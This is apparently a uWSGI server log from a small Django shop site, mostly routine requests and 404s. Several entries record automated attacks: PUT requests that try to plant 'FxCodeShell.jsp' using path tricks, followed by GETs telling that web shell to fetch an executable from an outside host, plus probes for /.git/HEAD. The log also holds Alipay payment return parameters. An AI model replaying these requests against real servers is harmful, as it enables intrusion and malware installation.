+[pid: 11510|app: 0|req: 34/34] 46.99.185.87 () {32 vars in 443 bytes} [Sun Mar 17 09:11:05 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 35/35] 120.78.231.236 () {26 vars in 263 bytes} [Sun Mar 17 09:57:23 2019] GET / => generated 55019 bytes in 32 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /axf/cart/
+[pid: 11510|app: 0|req: 36/36] 47.100.38.232 () {34 vars in 497 bytes} [Sun Mar 17 10:42:06 2019] GET /axf/cart/ => generated 3929 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/returnurl/
+[pid: 11510|app: 0|req: 37/37] 47.98.97.81 () {34 vars in 1806 bytes} [Sun Mar 17 10:48:18 2019] GET /axf/returnurl/?charset=utf-8&out_trade_no=895576035676037227&method=alipay.trade.page.pay.return&total_amount=162.20&sign=mlqje28zrcrordlqbanuvmaahoockzacull9ai5%2bztja68a8bkcdbfqjgdrryoc2lk3eu0e%2ftqa6fxijxcasi3ugottidim9nbqzzs0pyxmglol1lk07gj38yfxmgdvo0a3vatjhuveml1nsczfpl2mn7riztzzoknlk6yp3ppqho4jk3ffandeyz86fo9dnfjubeqaxp%2f3decmkohyu8hzcjfdf%2f9ejqtwtvsbnyqqeb%2fnbvybvot2bnzftcxbwsnlwj3w6sptn0p0wghdrerr6ux7taalfei55amgvc1tqemewccbtcgm8dgs84ztfsw%2fn%2fss%2bfsggfp51x2g1ww%3d%3d&trade_no=2019031622001443701000002941&auth_app_id=2016092300574253&version=1.0&app_id=2016092300574253&sign_type=rsa2&seller_id=2088102176844131&timestamp=2019-03-16+21%3a07%3a06 => generated 4639 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 11510|app: 0|req: 38/38] 47.92.233.42 () {42 vars in 626 bytes} [Sun Mar 17 10:48:49 2019] PUT /FxCodeShell.jsp%20 => generated 3952 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 11510|app: 0|req: 39/39] 47.92.233.42 () {42 vars in 640 bytes} [Sun Mar 17 10:48:49 2019] PUT /FxCodeShell.jsp::$DATA => generated 3968 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 11510|app: 0|req: 40/40] 47.92.233.42 () {42 vars in 622 bytes} [Sun Mar 17 10:48:49 2019] PUT /FxCodeShell.jsp/ => generated 3950 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 11510|app: 0|req: 41/41] 47.92.233.42 () {38 vars in 732 bytes} [Sun Mar 17 10:48:49 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 4027 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/mine/
+[pid: 11510|app: 0|req: 42/42] 47.92.38.53 () {34 vars in 495 bytes} [Sun Mar 17 10:49:27 2019] GET /axf/mine/ => generated 3929 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/generateorder/
+[pid: 11510|app: 0|req: 43/43] 120.79.184.41 () {34 vars in 515 bytes} [Sun Mar 17 10:53:07 2019] GET /axf/generateorder/ => generated 3956 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf
+[pid: 11510|app: 0|req: 44/44] 39.107.116.226 () {34 vars in 486 bytes} [Sun Mar 17 11:02:34 2019] GET /axf => generated 3911 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 45/45] 71.166.164.155 () {26 vars in 263 bytes} [Sun Mar 17 11:07:31 2019] GET / => generated 55019 bytes in 33 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /axf/returnurl/
+[pid: 11510|app: 0|req: 46/46] 47.92.6.234 () {34 vars in 1802 bytes} [Sun Mar 17 11:15:41 2019] GET /axf/returnurl/?charset=utf-8&out_trade_no=133437654672825751&method=alipay.trade.page.pay.return&total_amount=8.90&sign=hqytndemf5xc8bhivlmxebtcx%2fvb7su4c1xx4%2foazxjfzzr7420hbzdi2ewbbvqxmea4iumgsasvn8w%2feyxelpxvzazzbmmsgbhaluvq3a8ygnuspidzmcl%2b0c2ehm7ge2ygl9tt5daucilkfp5vc4ln7kgdt4nztx7dzhrh2kzjkxvgwu5jdbo2ad7qs22asnpnq%2bo2lfchtxdxn4jp6ir7se2u7h%2bem9ce6hpwkuslynzmeyqgmd4pp3x%2bafcxn%2b40prbaqvdhmf7djt9ucq82al6vwan2ywyqky5jgmztpi0klrj6tcl0k4pxksnabjraqxbest274ajuw9lhdq%3d%3d&trade_no=2019031622001443701000001002&auth_app_id=2016092300574253&version=1.0&app_id=2016092300574253&sign_type=rsa2&seller_id=2088102176844131&timestamp=2019-03-16+20%3a12%3a27 => generated 4637 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 11510|app: 0|req: 47/47] 47.92.6.234 () {34 vars in 489 bytes} [Sun Mar 17 11:15:41 2019] GET /index/ => generated 60066 bytes in 96 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /axf/market/0/3/
+[pid: 11510|app: 0|req: 48/48] 47.92.140.160 () {34 vars in 509 bytes} [Sun Mar 17 11:17:05 2019] GET /axf/market/0/3/ => generated 3947 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/market/
+[pid: 11510|app: 0|req: 49/49] 47.97.167.161 () {34 vars in 501 bytes} [Sun Mar 17 11:18:39 2019] GET /axf/market/ => generated 3935 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/orderdetail/112075482223669421/
+[pid: 11510|app: 0|req: 50/50] 47.92.141.208 () {34 vars in 549 bytes} [Sun Mar 17 11:24:03 2019] GET /axf/orderdetail/112075482223669421/ => generated 4007 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 11510|app: 0|req: 51/51] 101.132.98.159 () {34 vars in 492 bytes} [Sun Mar 17 11:29:12 2019] GET /login/ => generated 2114 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /axf/orderlist/
+[pid: 11510|app: 0|req: 52/52] 47.100.38.232 () {34 vars in 507 bytes} [Sun Mar 17 11:34:15 2019] GET /axf/orderlist/ => generated 3944 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/
+[pid: 11510|app: 0|req: 53/53] 101.132.69.5 () {34 vars in 486 bytes} [Sun Mar 17 11:37:50 2019] GET /axf/ => generated 3914 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /axf/orderdetail/828966720369723105/
+[pid: 11510|app: 0|req: 54/54] 39.107.127.149 () {34 vars in 550 bytes} [Sun Mar 17 11:45:39 2019] GET /axf/orderdetail/828966720369723105/ => generated 4007 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+goods Goods object None None
+[pid: 11510|app: 0|req: 55/55] 106.14.115.254 () {34 vars in 496 bytes} [Sun Mar 17 11:54:36 2019] GET /goods/2/ => generated 32288 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /axf/login/
+[pid: 11510|app: 0|req: 56/56] 47.92.98.215 () {34 vars in 498 bytes} [Sun Mar 17 12:02:16 2019] GET /axf/login/ => generated 3932 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /cache/global/img/gs.gif
+[pid: 11510|app: 0|req: 57/57] 80.82.70.187 () {32 vars in 414 bytes} [Sun Mar 17 14:42:59 2019] GET /cache/global/img/gs.gif => generated 3971 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 58/58] 115.127.78.234 () {32 vars in 452 bytes} [Sun Mar 17 14:51:31 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 59/59] 27.130.78.228 () {32 vars in 444 bytes} [Sun Mar 17 15:30:19 2019] GET / => generated 3887 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 60/60] 116.212.141.42 () {32 vars in 445 bytes} [Sun Mar 17 16:03:06 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 61/61] 116.212.155.39 () {32 vars in 445 bytes} [Sun Mar 17 16:14:41 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 62/62] 116.212.148.22 () {32 vars in 446 bytes} [Sun Mar 17 16:33:30 2019] GET / => generated 3887 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 63/63] 88.243.10.44 () {32 vars in 444 bytes} [Sun Mar 17 18:00:59 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+{'num': 0, 'carts': None}
+[pid: 11510|app: 0|req: 64/64] 116.77.73.186 () {44 vars in 741 bytes} [Sun Mar 17 18:22:20 2019] GET /carts/ => generated 7979 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+{'num': 0, 'carts': None}
+[pid: 11510|app: 0|req: 65/65] 116.77.73.186 () {44 vars in 741 bytes} [Sun Mar 17 18:22:31 2019] GET /carts/ => generated 7979 bytes in 6 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 66/66] 116.77.73.186 () {44 vars in 729 bytes} [Sun Mar 17 18:22:36 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+goods Goods object bab1a7cbf225f54aef76d546589c4ebd None
+[pid: 11510|app: 0|req: 67/67] 116.77.73.186 () {44 vars in 745 bytes} [Sun Mar 17 18:22:37 2019] GET /goods/2/ => generated 32288 bytes in 10 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+goods Goods object bab1a7cbf225f54aef76d546589c4ebd None
+[pid: 11510|app: 0|req: 68/68] 116.77.73.186 () {44 vars in 745 bytes} [Sun Mar 17 18:22:39 2019] GET /goods/2/ => generated 32288 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 11510|app: 0|req: 69/69] 116.77.73.186 () {46 vars in 786 bytes} [Sun Mar 17 18:22:43 2019] GET /login/ => generated 2114 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11510|app: 0|req: 70/70] 139.201.164.87 () {36 vars in 544 bytes} [Sun Mar 17 18:34:43 2019] GET /favicon.ico => generated 3935 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 71/71] 163.47.174.74 () {32 vars in 444 bytes} [Sun Mar 17 19:12:19 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 72/72] 110.74.198.129 () {32 vars in 452 bytes} [Sun Mar 17 19:37:11 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 73/73] 110.74.198.179 () {32 vars in 446 bytes} [Sun Mar 17 19:39:00 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 74/74] 110.74.222.151 () {32 vars in 445 bytes} [Sun Mar 17 19:43:11 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 75/75] 103.9.191.202 () {32 vars in 445 bytes} [Sun Mar 17 19:47:43 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /echo.php
+[pid: 11510|app: 0|req: 76/76] 139.162.88.63 () {32 vars in 401 bytes} [Sun Mar 17 20:30:05 2019] GET /echo.php?info=1234567890 => generated 3947 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 77/77] 47.92.133.31 () {34 vars in 459 bytes} [Sun Mar 17 20:38:09 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /
+[pid: 11510|app: 0|req: 78/78] 5.190.110.127 () {32 vars in 445 bytes} [Sun Mar 17 21:12:51 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 79/79] 111.162.152.248 () {36 vars in 461 bytes} [Sun Mar 17 21:56:57 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 80/80] 111.162.152.248 () {36 vars in 463 bytes} [Sun Mar 17 21:56:57 2019] GET / => generated 3886 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 81/81] 111.162.152.248 () {36 vars in 460 bytes} [Sun Mar 17 21:56:57 2019] GET / => generated 3883 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 82/82] 111.162.152.248 () {36 vars in 463 bytes} [Sun Mar 17 21:56:58 2019] GET / => generated 3886 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 11510|app: 0|req: 83/83] 47.92.0.170 () {42 vars in 625 bytes} [Sun Mar 17 23:26:59 2019] PUT /FxCodeShell.jsp%20 => generated 3952 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 11510|app: 0|req: 84/84] 47.92.0.170 () {42 vars in 639 bytes} [Sun Mar 17 23:26:59 2019] PUT /FxCodeShell.jsp::$DATA => generated 3968 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 11510|app: 0|req: 85/85] 47.92.0.170 () {42 vars in 621 bytes} [Sun Mar 17 23:26:59 2019] PUT /FxCodeShell.jsp/ => generated 3950 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 11510|app: 0|req: 86/86] 47.92.0.170 () {38 vars in 731 bytes} [Sun Mar 17 23:26:59 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 4027 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 11510|app: 0|req: 87/87] 14.28.39.245 () {44 vars in 739 bytes} [Sun Mar 17 23:56:13 2019] GET /login/ => generated 2114 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 88/88] 167.249.103.140 () {32 vars in 446 bytes} [Mon Mar 18 00:15:24 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /cache/global/img/gs.gif
+[pid: 11510|app: 0|req: 89/89] 80.82.70.187 () {32 vars in 414 bytes} [Mon Mar 18 00:47:39 2019] GET /cache/global/img/gs.gif => generated 3971 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 90/90] 103.10.61.90 () {30 vars in 416 bytes} [Mon Mar 18 00:50:23 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 91/91] 78.174.97.182 () {32 vars in 444 bytes} [Mon Mar 18 01:17:30 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 92/92] 106.15.76.92 () {26 vars in 261 bytes} [Mon Mar 18 01:30:08 2019] GET / => generated 55017 bytes in 31 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 93/93] 77.89.237.246 () {32 vars in 451 bytes} [Mon Mar 18 01:36:53 2019] GET / => generated 3887 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 94/94] 106.15.202.177 () {34 vars in 461 bytes} [Mon Mar 18 02:45:07 2019] GET / => generated 3884 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 95/95] 50.249.177.140 () {26 vars in 263 bytes} [Mon Mar 18 04:40:23 2019] GET / => generated 55019 bytes in 31 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /.git/HEAD
+[pid: 11510|app: 0|req: 96/96] 52.79.234.211 () {34 vars in 392 bytes} [Mon Mar 18 04:44:49 2019] GET /.git/HEAD => generated 3929 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 97/97] 178.73.215.171 () {28 vars in 281 bytes} [Mon Mar 18 04:49:00 2019] GET / => generated 55141 bytes in 33 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 98/98] 24.54.127.192 () {32 vars in 445 bytes} [Mon Mar 18 05:52:56 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 99/99] 125.64.94.201 () {26 vars in 262 bytes} [Mon Mar 18 06:22:39 2019] GET / => generated 55018 bytes in 31 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 100/100] 109.251.110.3 () {32 vars in 444 bytes} [Mon Mar 18 07:49:11 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 101/101] 47.92.155.0 () {34 vars in 456 bytes} [Mon Mar 18 07:59:00 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 102/102] 81.22.45.186 () {30 vars in 356 bytes} [Mon Mar 18 09:38:12 2019] GET / => generated 55320 bytes in 35 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 103/103] 47.97.21.76 () {26 vars in 260 bytes} [Mon Mar 18 09:53:26 2019] GET / => generated 55016 bytes in 31 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+goods Goods object None None
+[pid: 11510|app: 0|req: 104/104] 101.132.102.45 () {34 vars in 496 bytes} [Mon Mar 18 10:53:04 2019] GET /goods/2/ => generated 32288 bytes in 10 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+{'num': 0, 'carts': None}
+[pid: 11510|app: 0|req: 105/105] 47.98.37.19 () {34 vars in 489 bytes} [Mon Mar 18 10:56:17 2019] GET /carts/ => generated 7979 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11510|app: 0|req: 106/106] 182.114.231.101 () {36 vars in 545 bytes} [Mon Mar 18 11:02:54 2019] GET /favicon.ico => generated 3935 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 107/107] 81.22.45.186 () {30 vars in 356 bytes} [Mon Mar 18 11:05:16 2019] GET / => generated 55320 bytes in 33 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 11510|app: 0|req: 108/108] 80.82.70.187 () {32 vars in 414 bytes} [Mon Mar 18 11:13:37 2019] GET /cache/global/img/gs.gif => generated 3971 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 109/109] 172.104.108.109 () {34 vars in 382 bytes} [Mon Mar 18 11:19:54 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 110/110] 187.57.91.136 () {32 vars in 444 bytes} [Mon Mar 18 12:03:26 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 111/111] 139.162.119.197 () {32 vars in 382 bytes} [Mon Mar 18 12:25:06 2019] GET / => generated 3884 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 11510|app: 0|req: 112/112] 47.92.106.67 () {42 vars in 626 bytes} [Mon Mar 18 13:17:41 2019] PUT /FxCodeShell.jsp%20 => generated 3952 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 11510|app: 0|req: 113/113] 47.92.106.67 () {42 vars in 640 bytes} [Mon Mar 18 13:17:41 2019] PUT /FxCodeShell.jsp::$DATA => generated 3968 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 11510|app: 0|req: 114/114] 47.92.106.67 () {42 vars in 622 bytes} [Mon Mar 18 13:17:41 2019] PUT /FxCodeShell.jsp/ => generated 3950 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 11510|app: 0|req: 115/115] 47.92.106.67 () {38 vars in 732 bytes} [Mon Mar 18 13:17:41 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 4027 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 116/116] 195.200.244.197 () {32 vars in 453 bytes} [Mon Mar 18 14:12:38 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 14:27:54 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xda65c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xda65c0 pid: 13629 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 13629, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 14:28:20 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1eff5c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1eff5c0 pid: 13638 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 13638, cores: 1)
+[pid: 13638|app: 0|req: 1/1] 113.88.13.180 () {40 vars in 676 bytes} [Mon Mar 18 14:29:07 2019] GET /randomtest => generated 0 bytes in 12 msecs (HTTP/1.1 301) 3 headers in 117 bytes (1 switches on core 0)
